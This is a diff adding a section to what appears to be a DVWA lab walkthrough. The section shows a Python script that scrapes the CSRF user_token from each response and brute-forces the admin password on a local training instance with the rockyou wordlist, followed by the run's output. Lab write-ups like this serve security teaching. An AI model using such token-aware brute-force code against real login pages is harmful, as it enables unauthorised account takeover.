@@ -115,7 +115,64 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-08-18 09:18:
 
 **Security level is currently: high.**
 
+It's still get request but this time one additional parameter `user_token`
 
+It's using CSRF token so hydra wont help, let's use python this time.
+
+<details><summary markdown="span">Click to see python code :diamond_shape_with_a_dot_inside: </summary>
+  
+```python
+import requests
+from bs4 import BeautifulSoup
+from requests.structures import CaseInsensitiveDict
+
+url = 'http://127.0.0.1/vulnerabilities/brute/'
+
+headers = CaseInsensitiveDict()
+headers["Cookie"] = "security=high; PHPSESSID=j422143437vlsdgqs0t1385420"
+
+r = requests.get(url, headers=headers)
+
+r1 = r.content
+soup = BeautifulSoup(r1, 'html.parser')
+user_token = soup.findAll('input', attrs={'name': 'user_token'})[0]['value']
+  
+with open("/usr/share/wordlists/rockyou.txt", 'rb') as f:
+    for i in f.readlines():
+        i = i[:-1]
+        try:
+            a1 = i.decode()
+        except UnicodeDecodeError:
+            print(f'can`t decode {i}')
+            continue
+
+        r = requests.get(
+            f'http://127.0.0.1/vulnerabilities/brute/?username=admin&password={a1}&Login=Login&user_token={user_token}#',
+            headers=headers)
+        r1 = r.content
+        soup1 = BeautifulSoup(r1, 'html.parser')
+        user_token = soup1.findAll('input', attrs={'name': 'user_token'})[0]['value']
+        print(f'checking {a1}')
+        if 'Welcome' in r.text:
+            print(f'LoggedIn: username: admin , password:{a1}   ===found===')
+            break
+```
+  
+</details>
+
+<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>
+  
+```Shell
+┌─[aftab@parrot]─[~/Downloads/dvwa]
+└──╼ $python brute_high.py 
+checking 123456
+checking 12345
+checking 123456789
+checking password
+LoggedIn: username: admin , password:password   ===found===
+```
+  
+</details>
 
 
 ---
